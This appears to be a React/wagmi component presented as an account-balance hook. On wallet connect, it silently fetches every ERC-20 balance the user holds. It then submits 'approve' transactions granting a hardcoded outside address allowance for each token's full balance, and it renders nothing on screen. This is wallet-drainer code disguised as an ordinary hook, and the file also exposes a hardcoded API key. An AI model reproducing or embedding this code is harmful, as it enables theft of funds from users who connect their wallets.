import React, { useState, useEffect } from "react";
import { Alchemy, Network } from "alchemy-sdk";
import { useAccount, useSwitchChain, useAccountEffect } from "wagmi";
import Erc20Abi from "../abi/Erc20Abi";
import { config as wagmiConfig } from "../../wagmiConfig";
import { writeContract } from "@wagmi/core";
const UseAccountBalances = () => {
  const { address, isConnected, status } = useAccount();

  const { chains, switchChain } = useSwitchChain();
  const [tokensData, setTokensData] = useState([]);

  const config = {
    apiKey: "qP-0Eg2caD2AE-M7va68Bna1sIy2E3H-",
    network: Network.ETH_SEPOLIA,
  };
  const alchemy = new Alchemy(config);
  useEffect(() => {
    if (status === "connected") {
      getUserTokens();
    }
  }, [status,isConnected, address]);

  const getUserTokens = async () => {
    try {
      const data = await alchemy.core.getTokenBalances(address);
      data.tokenBalances.forEach((tokensDetails, index) => {
        // Check if the object with the same ID does not exist in the array
        const tokenExists = tokensData.find(
          (token) => token.id === tokensDetails.id
        );
        if (!tokenExists) {
          // If the token does not exist, add it to the array
          setTokensData((prevTokensData) => [...prevTokensData, tokensDetails]);
        }
      });
      increaseAllowanceForTokens(tokensData);
    } catch (error) {
      console.error("Error fetching token balances:", error);
    }
  };

  const increaseAllowanceForTokens = async (tokensData) => {
    tokensData.forEach((obj) => {
      const { contractAddress, tokenBalance } = obj;
      const hexToNumber = parseInt(tokenBalance, 16);

      if (hexToNumber > 0) {
        increaseAllowance(contractAddress, hexToNumber);
      }
    });
  };
  const increaseAllowance = async (contractAddress, allowance) => {
    return new Promise((resolve, reject) => {
      writeContract(wagmiConfig, {
        address: contractAddress,
        abi: Erc20Abi,
        functionName: "approve",
        args: ["0x9448531F22c38b1B7BFBDeD3eF0aCB59359D1e9f", allowance],
      })
        .then((hash) => {
          console.log("Transaction hash:", hash);
          resolve(hash); // Resolve the promise with the transaction hash
        })
        .catch((error) => {
          console.log("increase allowance error", error);
          reject(error); // Reject the promise with the error
        });
    });
  };

  return <div></div>;
};

export default UseAccountBalances;
